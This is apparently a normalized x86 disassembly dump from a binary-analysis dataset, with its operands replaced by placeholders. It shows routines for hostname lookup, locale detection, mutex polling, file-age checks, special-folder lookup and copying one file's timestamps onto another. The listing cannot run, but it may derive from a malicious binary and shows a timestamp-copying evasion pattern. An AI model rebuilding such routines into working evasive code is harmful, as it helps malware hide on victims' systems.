lea eax [ ebp - 0x5d0 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x5d0 ]
pop ecx
push eax
call gethostbyname
cmp eax edi
je r-xdata
lea eax [ ebp - 0x4d0 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x4d0 ]
push eax
call sub_402f22
mov eax [ esi - 0x8 ]
add esp 0xc
and eax 0x2
cmp al 0x2
jne r-xdata
push eax
lea eax [ ebp - 0x4d0 ]
push eax
call strcat
pop ecx
pop ecx
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push eax
lea eax [ ebp - 0x50 ]
push eax
call strcpy
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0xd0 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0xd0 ]
push eax
lea eax [ ebp - 0x4d0 ]
push eax
call strcat
add esp 0x1c
inc [ ebp + 0x8 ]
add esi 0x20
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
lea eax [ esi - 0x14 ]
push eax
call sub_403691
pop ecx
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x4d0 ]
push rw-data
push eax
call strcpy
mov eax [ esi ]
pop ecx
cmp eax edi
pop ecx
je r-xdata
jmp r-xdata
sub_4038c0
push ebp
mov ebp esp
sub esp 0x120
mov dl [ rw-data ]
push esi
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1f ]
mov [ ebp - 0x20 ] dl
[ edi ]
stosw [ edi ]
push 0xf
mov [ ebp - 0x60 ] dl
stosb [ edi ]
pop esi
xor eax eax
mov ecx esi
lea edi [ ebp - 0x5f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx esi
xor eax eax
lea edi [ ebp - 0x9f ]
mov [ ebp - 0xa0 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx esi
xor eax eax
lea edi [ ebp - 0xdf ]
mov [ ebp - 0xe0 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx esi
xor eax eax
lea edi [ ebp - 0x11f ]
mov [ ebp - 0x120 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_403b4b
mov esi [ ebp + 0x8 ]
pop ecx
mov eax [ esi + 0x10 ]
sub eax 0x0
je r-xdata
push rw-data
dec eax
je r-xdata
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call strcpy
cmp [ esi + 0x4 ] 0x4
pop ecx
pop ecx
jne r-xdata
dec eax
je r-xdata
mov edi [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
push edi
call strcpy
mov esi rw-data
push esi
push edi
call strcat
lea eax [ ebp - 0x60 ]
push eax
push edi
call strcat
push esi
push edi
call strcat
lea eax [ ebp - 0xa0 ]
push eax
push edi
call strcat
push esi
push edi
call strcat
lea eax [ ebp - 0xe0 ]
push eax
push edi
call strcat
push esi
push edi
call strcat
add esp 0x40
lea eax [ ebp - 0x120 ]
push eax
push edi
call strcat
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov edi [ sprintf@IAT ]
cmp eax 0x5
jne r-xdata
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call strcpy
jmp r-xdata
cmp eax 0xa
jne r-xdata
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call strcpy
mov al [ esi + 0x15 ]
pop ecx
cmp al 0x43
pop ecx
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call edi
add esp 0x10
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
pop ecx
pop ecx
pop edi
pop esi
leave
retn
cmp eax 0x5a
jne r-xdata
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call strcpy
cmp [ esi + 0x15 ] 0x41
pop ecx
pop ecx
jne r-xdata
push rw-data
jmp r-xdata
cmp al 0x42
jne r-xdata
push rw-data
mov al [ esi + 0x9a ]
cmp al 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
lea eax [ ebp - 0x20 ]
push eax
call strcat
jmp r-xdata
cmp al 0x3
jne r-xdata
test [ esi + 0x99 ] 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call strcpy
pop ecx
pop ecx
lea eax [ esi + 0x14 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
call strcpy
mov eax [ esi + 0xc ]
and eax 0xffff
push eax
lea eax [ ebp - 0x120 ]
push rw-data
push eax
call edi
add esp 0x14
jmp r-xdata
mov ax [ esi + 0x98 ]
test al 0x80
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push eax
lea eax [ ebp - 0x20 ]
push rw-data
push eax
call edi
add esp 0xc
jmp r-xdata
push rw-data
cmp [ esi ] 0x9c
jne r-xdata
test al 0x2
je r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
call strcpy
pop ecx
pop ecx
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
sub_403b4b
push ebp
mov ebp esp
sub esp 0x530
push ebx
push esi
push edi
push 0x1
pop esi
xor eax eax
push 0x2
mov [ ebp - 0x530 ] 0x36
pop ecx
mov [ ebp - 0x52e ] si
push 0x3
mov [ ebp - 0x52c ] rw-data
pop edx
mov [ ebp - 0x528 ] 0x1c
push 0x4
mov [ ebp - 0x526 ] si
pop edi
mov [ ebp - 0x524 ] rw-data
mov [ ebp - 0x520 ] si
mov [ ebp - 0x51e ] 0x11
mov [ ebp - 0x51c ] rw-data
mov [ ebp - 0x518 ] si
mov [ ebp - 0x516 ] ax
mov [ ebp - 0x514 ] rw-data
mov [ ebp - 0x510 ] cx
mov [ ebp - 0x50e ] ax
mov [ ebp - 0x50c ] rw-data
mov [ ebp - 0x508 ] dx
mov [ ebp - 0x506 ] ax
mov [ ebp - 0x504 ] rw-data
mov [ ebp - 0x500 ] di
mov [ ebp - 0x4fe ] ax
mov [ ebp - 0x4fc ] rw-data
mov [ ebp - 0x4f8 ] 0x5
mov [ ebp - 0x4f6 ] ax
mov [ ebp - 0x4f4 ] rw-data
mov [ ebp - 0x4f0 ] 0x6
mov [ ebp - 0x4ee ] ax
mov [ ebp - 0x4ec ] rw-data
mov [ ebp - 0x4e8 ] 0x7
mov [ ebp - 0x4e6 ] ax
mov [ ebp - 0x4e4 ] rw-data
mov [ ebp - 0x4e0 ] 0x8
mov [ ebp - 0x4de ] ax
mov [ ebp - 0x4dc ] rw-data
mov [ ebp - 0x4d8 ] 0x9
mov [ ebp - 0x4d6 ] ax
mov [ ebp - 0x4d4 ] rw-data
mov [ ebp - 0x4d0 ] 0xa
mov [ ebp - 0x4ce ] ax
mov [ ebp - 0x4cc ] rw-data
mov [ ebp - 0x4c8 ] 0xb
mov [ ebp - 0x4c6 ] ax
mov [ ebp - 0x4c4 ] rw-data
mov [ ebp - 0x4c0 ] 0xc
mov [ ebp - 0x4be ] ax
mov [ ebp - 0x4bc ] rw-data
mov [ ebp - 0x4b8 ] 0xd
mov [ ebp - 0x4b6 ] ax
mov [ ebp - 0x4b4 ] rw-data
mov [ ebp - 0x4b0 ] 0xe
mov [ ebp - 0x4ae ] ax
mov [ ebp - 0x4ac ] rw-data
mov [ ebp - 0x4a8 ] 0xf
mov [ ebp - 0x4a6 ] ax
mov [ ebp - 0x4a4 ] rw-data
mov [ ebp - 0x4a0 ] 0x10
mov [ ebp - 0x49e ] ax
mov [ ebp - 0x49c ] rw-data
mov [ ebp - 0x498 ] 0x2b
mov [ ebp - 0x496 ] si
mov [ ebp - 0x494 ] rw-data
mov [ ebp - 0x490 ] 0x4d
mov [ ebp - 0x48e ] si
mov [ ebp - 0x48c ] rw-data
mov [ ebp - 0x488 ] 0x2c
mov [ ebp - 0x486 ] dx
mov [ ebp - 0x484 ] rw-data
mov [ ebp - 0x480 ] si
mov [ ebp - 0x47e ] ax
mov [ ebp - 0x47c ] rw-data
mov [ ebp - 0x448 ] di
mov [ ebp - 0x428 ] di
mov [ ebp - 0x3d0 ] di
mov ebx rw-data
mov edi rw-data
mov [ ebp - 0x478 ] cx
mov [ ebp - 0x476 ] ax
mov [ ebp - 0x474 ] ebx
mov [ ebp - 0x470 ] 0x2d
mov [ ebp - 0x46e ] si
mov [ ebp - 0x46c ] rw-data
mov [ ebp - 0x468 ] 0x23
mov [ ebp - 0x466 ] si
mov [ ebp - 0x464 ] rw-data
mov [ ebp - 0x460 ] 0x45
mov [ ebp - 0x45e ] si
mov [ ebp - 0x45c ] rw-data
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x456 ] si
mov [ ebp - 0x454 ] rw-data
mov [ ebp - 0x450 ] dx
mov [ ebp - 0x44e ] si
mov [ ebp - 0x44c ] rw-data
mov [ ebp - 0x446 ] 0x6
mov [ ebp - 0x444 ] rw-data
mov [ ebp - 0x440 ] si
mov [ ebp - 0x43e ] ax
mov [ ebp - 0x43c ] rw-data
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x434 ] rw-data
mov [ ebp - 0x430 ] dx
mov [ ebp - 0x42e ] ax
mov [ ebp - 0x42c ] rw-data
mov [ ebp - 0x426 ] ax
mov [ ebp - 0x424 ] rw-data
mov [ ebp - 0x420 ] 0x5
mov [ ebp - 0x41e ] ax
mov [ ebp - 0x41c ] rw-data
mov [ ebp - 0x418 ] 0x5
mov [ ebp - 0x416 ] si
mov [ ebp - 0x414 ] rw-data
mov [ ebp - 0x410 ] 0x6
mov [ ebp - 0x40e ] si
mov [ ebp - 0x40c ] rw-data
mov [ ebp - 0x408 ] 0x13
mov [ ebp - 0x406 ] dx
mov [ ebp - 0x404 ] rw-data
mov [ ebp - 0x400 ] si
mov [ ebp - 0x3fe ] ax
mov [ ebp - 0x3fc ] rw-data
mov [ ebp - 0x3f8 ] cx
mov [ ebp - 0x3f6 ] ax
mov [ ebp - 0x3f4 ] rw-data
mov [ ebp - 0x3f0 ] 0x9
mov [ ebp - 0x3ee ] 0xe
mov [ ebp - 0x3ec ] rw-data
mov [ ebp - 0x3e8 ] si
mov [ ebp - 0x3e6 ] ax
mov [ ebp - 0x3e4 ] rw-data
mov [ ebp - 0x3e0 ] cx
mov [ ebp - 0x3de ] ax
mov [ ebp - 0x3dc ] rw-data
mov [ ebp - 0x3d8 ] dx
mov [ ebp - 0x3d6 ] ax
mov [ ebp - 0x3d4 ] rw-data
mov [ ebp - 0x3ce ] ax
mov [ ebp - 0x3cc ] edi
mov [ ebp - 0x3c8 ] 0x5
mov [ ebp - 0x3c6 ] ax
mov [ ebp - 0x3c4 ] rw-data
mov [ ebp - 0x3c0 ] 0x6
mov [ ebp - 0x3be ] ax
mov [ ebp - 0x3bc ] rw-data
mov [ ebp - 0x3b8 ] 0x7
mov [ ebp - 0x3b6 ] ax
mov [ ebp - 0x3b4 ] rw-data
mov [ ebp - 0x3b0 ] 0x8
mov [ ebp - 0x3ae ] ax
mov [ ebp - 0x3ac ] rw-data
mov [ ebp - 0x3a8 ] 0x9
mov [ ebp - 0x344 ] edi
mov edi rw-data
mov [ ebp - 0x3a6 ] ax
mov [ ebp - 0x3a4 ] rw-data
mov [ ebp - 0x3a0 ] 0xa
mov [ ebp - 0x39e ] ax
mov [ ebp - 0x39c ] rw-data
mov [ ebp - 0x398 ] 0xb
mov [ ebp - 0x396 ] ax
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x390 ] 0xc
mov [ ebp - 0x38e ] ax
mov [ ebp - 0x38c ] rw-data
mov [ ebp - 0x388 ] 0xd
mov [ ebp - 0x386 ] ax
mov [ ebp - 0x384 ] rw-data
mov [ ebp - 0x380 ] 0x25
mov [ ebp - 0x37e ] si
mov [ ebp - 0x37c ] rw-data
mov [ ebp - 0x378 ] 0x38
mov [ ebp - 0x376 ] si
mov [ ebp - 0x374 ] rw-data
mov [ ebp - 0x370 ] 0x29
mov [ ebp - 0x36e ] si
mov [ ebp - 0x36c ] rw-data
mov [ ebp - 0x368 ] 0xb
mov [ ebp - 0x366 ] si
mov [ ebp - 0x364 ] rw-data
mov [ ebp - 0x360 ] 0xc
mov [ ebp - 0x35e ] 0x7
mov [ ebp - 0x35c ] rw-data
mov [ ebp - 0x358 ] si
mov [ ebp - 0x356 ] ax
mov [ ebp - 0x354 ] rw-data
mov [ ebp - 0x350 ] cx
mov [ ebp - 0x34e ] ax
mov [ ebp - 0x34c ] rw-data
mov [ ebp - 0x348 ] dx
mov [ ebp - 0x346 ] ax
mov [ ebp - 0x340 ] 0x4
mov [ ebp - 0x33e ] ax
mov [ ebp - 0x33c ] edi
mov [ ebp - 0x338 ] 0x5
mov [ ebp - 0x336 ] ax
mov [ ebp - 0x334 ] rw-data
mov [ ebp - 0x330 ] 0x6
mov [ ebp - 0x32e ] ax
mov [ ebp - 0x32c ] rw-data
mov [ ebp - 0x328 ] 0x37
mov [ ebp - 0x326 ] si
mov [ ebp - 0x324 ] rw-data
mov [ ebp - 0x320 ] 0x7
mov [ ebp - 0x31e ] 0x6
mov [ ebp - 0x31c ] rw-data
mov [ ebp - 0x318 ] si
mov [ ebp - 0x316 ] ax
mov [ ebp - 0x314 ] rw-data
mov [ ebp - 0x310 ] cx
mov [ ebp - 0x30e ] ax
mov [ ebp - 0x30c ] edi
mov [ ebp - 0x308 ] dx
mov [ ebp - 0x306 ] ax
mov [ ebp - 0x304 ] rw-data
mov [ ebp - 0x300 ] 0x4
mov [ ebp - 0x2fe ] ax
mov [ ebp - 0x2fc ] rw-data
mov [ ebp - 0x2f8 ] 0x5
mov [ ebp - 0x2f6 ] ax
mov [ ebp - 0x2f4 ] rw-data
mov [ ebp - 0x2f0 ] 0x8
mov [ ebp - 0x2ee ] si
mov [ ebp - 0x2ec ] rw-data
mov [ ebp - 0x2e8 ] 0x47
mov [ ebp - 0x2e6 ] si
mov [ ebp - 0x2e4 ] rw-data
mov [ ebp - 0x2e0 ] 0xd
mov [ ebp - 0x2de ] si
mov [ ebp - 0x2dc ] rw-data
mov [ ebp - 0x2d8 ] 0x39
mov [ ebp - 0x2d6 ] si
mov [ ebp - 0x2d4 ] rw-data
mov [ ebp - 0x2a4 ] edi
mov edi rw-data
mov [ ebp - 0x2d0 ] 0xe
mov [ ebp - 0x2ce ] si
mov [ ebp - 0x2cc ] rw-data
mov [ ebp - 0x2c8 ] 0xf
mov [ ebp - 0x2c6 ] si
mov [ ebp - 0x2c4 ] rw-data
mov [ ebp - 0x2c0 ] 0x21
mov [ ebp - 0x2be ] si
mov [ ebp - 0x2bc ] rw-data
mov [ ebp - 0x2b8 ] 0x10
mov [ ebp - 0x2b6 ] dx
mov [ ebp - 0x2b4 ] rw-data
mov [ ebp - 0x2b0 ] si
mov [ ebp - 0x2ae ] ax
mov [ ebp - 0x2ac ] rw-data
mov [ ebp - 0x2a8 ] cx
mov [ ebp - 0x2a6 ] ax
mov [ ebp - 0x2a0 ] 0x11
mov [ ebp - 0x29e ] si
mov [ ebp - 0x29c ] rw-data
mov [ ebp - 0x298 ] 0x4b
mov [ ebp - 0x296 ] si
mov [ ebp - 0x294 ] rw-data
mov [ ebp - 0x290 ] 0x57
mov [ ebp - 0x28e ] si
mov [ ebp - 0x28c ] rw-data
mov [ ebp - 0x288 ] 0x12
mov [ ebp - 0x286 ] cx
mov [ ebp - 0x284 ] rw-data
mov [ ebp - 0x280 ] si
mov [ ebp - 0x27e ] ax
mov [ ebp - 0x27c ] rw-data
mov [ ebp - 0x278 ] 0x60
mov [ ebp - 0x276 ] dx
mov [ ebp - 0x274 ] rw-data
mov [ ebp - 0x270 ] si
mov [ ebp - 0x26e ] ax
mov [ ebp - 0x26c ] rw-data
mov [ ebp - 0x268 ] cx
mov [ ebp - 0x266 ] ax
mov [ ebp - 0x264 ] edi
mov [ ebp - 0x260 ] 0x3f
mov [ ebp - 0x25e ] si
mov [ ebp - 0x25c ] rw-data
mov [ ebp - 0x258 ] 0x26
mov [ ebp - 0x256 ] si
mov [ ebp - 0x254 ] rw-data
mov [ ebp - 0x250 ] 0x27
mov [ ebp - 0x24e ] dx
mov [ ebp - 0x24c ] rw-data
mov [ ebp - 0x248 ] si
mov [ ebp - 0x246 ] ax
mov [ ebp - 0x244 ] rw-data
mov [ ebp - 0x240 ] cx
mov [ ebp - 0x23e ] ax
mov [ ebp - 0x23c ] rw-data
mov [ ebp - 0x238 ] 0x2f
mov [ ebp - 0x236 ] si
mov [ ebp - 0x234 ] rw-data
mov [ ebp - 0x230 ] 0x3e
mov [ ebp - 0x22e ] dx
mov [ ebp - 0x22c ] rw-data
mov [ ebp - 0x228 ] si
mov [ ebp - 0x226 ] ax
mov [ ebp - 0x224 ] rw-data
mov [ ebp - 0x220 ] cx
mov [ ebp - 0x21e ] ax
mov [ ebp - 0x21c ] rw-data
mov [ ebp - 0x218 ] 0x4c
mov [ ebp - 0x216 ] si
mov [ ebp - 0x214 ] rw-data
mov [ ebp - 0x210 ] 0x58
mov [ ebp - 0x20e ] si
mov [ ebp - 0x20c ] rw-data
mov [ ebp - 0x208 ] 0x4e
mov [ ebp - 0x206 ] si
mov [ ebp - 0x204 ] rw-data
mov [ ebp - 0x200 ] 0x61
mov [ ebp - 0x1fe ] dx
mov [ ebp - 0x1fc ] rw-data
mov [ ebp - 0x1f8 ] si
mov [ ebp - 0x1f6 ] ax
mov [ ebp - 0x1f4 ] rw-data
mov [ ebp - 0x1f0 ] cx
mov [ ebp - 0x1ee ] ax
mov [ ebp - 0x1ec ] edi
mov [ ebp - 0x1e8 ] ax
mov [ ebp - 0x1e6 ] 0x4
mov [ ebp - 0x1e4 ] rw-data
mov [ ebp - 0x1e0 ] ax
mov [ ebp - 0x1de ] ax
mov [ ebp - 0x1dc ] rw-data
mov [ ebp - 0x1d8 ] si
mov [ ebp - 0x1d6 ] ax
mov [ ebp - 0x1d4 ] rw-data
mov [ ebp - 0x1d0 ] cx
mov [ ebp - 0x1ce ] ax
mov [ ebp - 0x1cc ] rw-data
mov [ ebp - 0x1c8 ] 0x14
mov [ ebp - 0x1c6 ] dx
mov [ ebp - 0x1c4 ] rw-data
mov [ ebp - 0x1c0 ] si
mov [ ebp - 0x1be ] ax
mov [ ebp - 0x1bc ] rw-data
mov [ ebp - 0x1b8 ] cx
mov [ ebp - 0x1b6 ] ax
mov [ ebp - 0x1b4 ] rw-data
mov [ ebp - 0x1b0 ] 0x48
mov [ ebp - 0x1ae ] si
mov [ ebp - 0x1ac ] rw-data
mov [ ebp - 0x1a8 ] 0x15
mov [ ebp - 0x1a6 ] si
mov [ ebp - 0x1a4 ] rw-data
mov [ ebp - 0x1a0 ] 0x16
mov [ ebp - 0x19e ] dx
mov [ ebp - 0x19c ] rw-data
mov [ ebp - 0x198 ] si
mov [ ebp - 0x196 ] ax
mov [ ebp - 0x194 ] rw-data
mov [ ebp - 0x190 ] cx
mov [ ebp - 0x18e ] ax
mov [ ebp - 0x18c ] rw-data
mov [ ebp - 0x188 ] 0x46
mov [ ebp - 0x186 ] si
mov [ ebp - 0x184 ] rw-data
mov [ ebp - 0x180 ] 0x18
mov [ ebp - 0x17e ] si
mov [ ebp - 0x17c ] rw-data
mov [ ebp - 0x178 ] 0x19
mov [ ebp - 0x176 ] si
mov [ ebp - 0x174 ] rw-data
mov [ ebp - 0x170 ] 0x4f
mov [ ebp - 0x16e ] si
mov [ ebp - 0x16c ] rw-data
mov [ ebp - 0x168 ] 0x1a
mov [ ebp - 0x166 ] 0x4
mov [ ebp - 0x164 ] rw-data
mov [ ebp - 0x160 ] si
mov [ ebp - 0x15e ] ax
mov [ ebp - 0x15c ] rw-data
mov [ ebp - 0x158 ] cx
mov [ ebp - 0x156 ] ax
mov [ ebp - 0x154 ] rw-data
mov [ ebp - 0x150 ] dx
mov [ ebp - 0x14e ] ax
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] 0x59
mov [ ebp - 0x146 ] si
mov [ ebp - 0x144 ] rw-data
mov [ ebp - 0x140 ] 0x1b
mov [ ebp - 0x13e ] si
mov [ ebp - 0x13c ] rw-data
mov [ ebp - 0x138 ] 0x24
mov [ ebp - 0x136 ] si
mov [ ebp - 0x134 ] rw-data
mov [ ebp - 0x130 ] 0xa
mov [ ebp - 0x12e ] 0x15
mov [ ebp - 0x12c ] rw-data
mov [ ebp - 0x128 ] si
mov [ ebp - 0x126 ] ax
mov [ ebp - 0x124 ] rw-data
mov [ ebp - 0x120 ] cx
mov [ ebp - 0x11e ] ax
mov [ ebp - 0x11c ] rw-data
mov [ ebp - 0x118 ] dx
mov [ ebp - 0x116 ] ax
mov [ ebp - 0x114 ] rw-data
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10e ] ax
mov [ ebp - 0x10c ] rw-data
mov [ ebp - 0x108 ] 0x5
mov [ ebp - 0x106 ] ax
mov [ ebp - 0x104 ] rw-data
mov [ ebp - 0x100 ] 0x6
mov [ ebp - 0xfe ] ax
mov [ ebp - 0xfc ] rw-data
mov [ ebp - 0xf8 ] 0x7
mov [ ebp - 0xf6 ] ax
mov [ ebp - 0xf4 ] rw-data
mov [ ebp - 0xf0 ] 0x8
mov [ ebp - 0xee ] ax
mov [ ebp - 0xec ] rw-data
mov [ ebp - 0xe8 ] 0x9
mov [ ebp - 0xe6 ] ax
mov [ ebp - 0xe4 ] rw-data
mov [ ebp - 0xe0 ] 0xa
mov [ ebp - 0xde ] ax
mov [ ebp - 0xdc ] rw-data
mov [ ebp - 0xd8 ] 0xb
mov [ ebp - 0xd6 ] ax
mov [ ebp - 0xd4 ] rw-data
mov [ ebp - 0xd0 ] 0xc
mov [ ebp - 0xce ] ax
mov [ ebp - 0xcc ] rw-data
mov [ ebp - 0xc8 ] 0xd
mov [ ebp - 0xc6 ] ax
mov [ ebp - 0xc4 ] rw-data
mov [ ebp - 0xc0 ] 0xe
mov [ ebp - 0xbe ] ax
mov [ ebp - 0xbc ] rw-data
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xb6 ] ax
mov [ ebp - 0xb4 ] rw-data
mov [ ebp - 0xb0 ] 0x10
mov [ ebp - 0xae ] ax
mov [ ebp - 0xac ] rw-data
mov [ ebp - 0xa8 ] 0x11
mov [ ebp - 0xa6 ] ax
mov [ ebp - 0xa4 ] rw-data
mov [ ebp - 0xa0 ] 0x12
mov [ ebp - 0x9e ] ax
mov [ ebp - 0x9c ] rw-data
mov [ ebp - 0x98 ] 0x13
mov [ ebp - 0x96 ] ax
mov [ ebp - 0x94 ] rw-data
mov [ ebp - 0x90 ] 0x14
mov [ ebp - 0x8e ] ax
mov [ ebp - 0x8c ] rw-data
mov [ ebp - 0x88 ] 0x41
mov [ ebp - 0x86 ] si
mov [ ebp - 0x84 ] rw-data
mov [ ebp - 0x80 ] 0x1d
mov [ ebp - 0x7e ] dx
mov [ ebp - 0x7c ] rw-data
mov [ ebp - 0x78 ] si
mov [ ebp - 0x76 ] ax
mov [ ebp - 0x74 ] rw-data
mov [ ebp - 0x70 ] cx
mov [ ebp - 0x6e ] ax
mov [ ebp - 0x6c ] rw-data
mov [ ebp - 0x68 ] 0x49
mov [ ebp - 0x66 ] si
mov [ ebp - 0x64 ] rw-data
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x5e ] si
mov [ ebp - 0x5c ] rw-data
mov [ ebp - 0x58 ] 0x4a
mov [ ebp - 0x56 ] si
mov [ ebp - 0x54 ] rw-data
mov [ ebp - 0x50 ] 0x1e
mov [ ebp - 0x4e ] si
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x4c ] rw-data
mov [ ebp - 0x48 ] 0x1f
mov [ ebp - 0x46 ] si
mov [ ebp - 0x44 ] rw-data
mov [ ebp - 0x40 ] 0x22
mov [ ebp - 0x3e ] si
mov [ ebp - 0x3c ] rw-data
mov [ ebp - 0x38 ] 0x20
mov [ ebp - 0x36 ] dx
mov [ ebp - 0x34 ] rw-data
mov [ ebp - 0x30 ] si
mov [ ebp - 0x2e ] ax
mov [ ebp - 0x2c ] rw-data
mov [ ebp - 0x28 ] cx
mov [ ebp - 0x26 ] ax
mov [ ebp - 0x20 ] 0x43
mov [ ebp - 0x1e ] dx
mov [ ebp - 0x1c ] rw-data
mov [ ebp - 0x18 ] si
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x14 ] rw-data
mov [ ebp - 0x10 ] cx
mov [ ebp - 0xe ] ax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x2a
mov [ ebp - 0x6 ] si
mov [ ebp - 0x4 ] rw-data
xor edi edi
call [ GetSystemDefaultLangID@IAT ]
mov cl al
and ecx 0xff
shr ax 0xa
mov ebx eax
push [ ebp + edi * 8 - 0x52c ]
push [ ebp + 0x8 ]
call strcpy
cmp [ ebp + edi * 8 - 0x52e ] si
pop ecx
pop ecx
je r-xdata
movzx eax [ ebp + edi * 8 - 0x52e ]
add edi eax
cmp edi 0xa6
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
movzx eax bx
add eax edi
push [ ebp + eax * 8 - 0x52c ]
push [ ebp + 0x8 ]
call strcat
jmp r-xdata
cmp [ ebp + edi * 8 - 0x530 ] cx
je r-xdata
push rw-data
push [ ebp + 0x8 ]
call strcpy
pop ecx
pop ecx
sub_404bae
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ OpenMutexA@IAT ]
xor ebp ebp
push edi
mov edi [ CloseHandle@IAT ]
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] 0x12b
mov ebx 0x1f0001
test ebp ebp
jne r-xdata
push rw-data
push 0x0
push ebx
call esi
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
push rw-data
push ebp
push ebx
call esi
test eax eax
je r-xdata
push eax
call edi
mov [ esp + 0x10 ] 0x1
push 0x3e8
call [ Sleep@IAT ]
mov eax [ esp + 0x14 ]
dec [ esp + 0x14 ]
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push rw-data
push 0x0
push ebx
call esi
test eax eax
je r-xdata
push eax
call edi
push 0x1
pop ebp
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push 0x1
pop eax
xor eax eax
jmp r-xdata
push eax
call edi
push 0x1
pop ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub_404c4e
push ebp
mov ebp esp
sub esp 0x358
push esi
xor esi esi
cmp [ rw-data ] esi
push edi
jne r-xdata
push rw-data
lea eax [ ebp - 0x358 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x358 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
add [ ebp - 0x8 ] 0xd71bc000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
adc [ ebp - 0x4 ] 0xfffffa7f
call [ CompareFileTime@IAT ]
test eax eax
jg r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
leave
retn
push edi
call [ FindClose@IAT ]
mov eax esi
push 0x1
pop esi
sub_404cef
push ebp
mov ebp esp
sub esp 0x10c
lea eax [ ebp - 0x4 ]
push esi
push eax
call [ SHGetMalloc@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push 0x0
call [ SHGetSpecialFolderLocation@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x8 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
lea eax [ ebp - 0x10c ]
push eax
call strlen
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
inc eax
pop ecx
cmp [ ebp + 0xc ] eax
pop ecx
jae r-xdata
lea eax [ ebp - 0x10c ]
push eax
push [ ebp + 0x8 ]
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
pop esi
leave
retn
sub_404d86
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
push edi
mov esi [ CreateFileA@IAT ]
push 0x2000000
push 0x3
push edi
push 0x5
push 0x80000000
push [ ebp + 0x8 ]
call esi
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
push 0x80
push 0x3
push edi
push edi
push 0x40000000
push [ ebp + 0xc ]
call esi
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetFileTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ SetFileTime@IAT ]
mov esi [ CloseHandle@IAT ]
push ebx
call esi
push edi
call esi
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
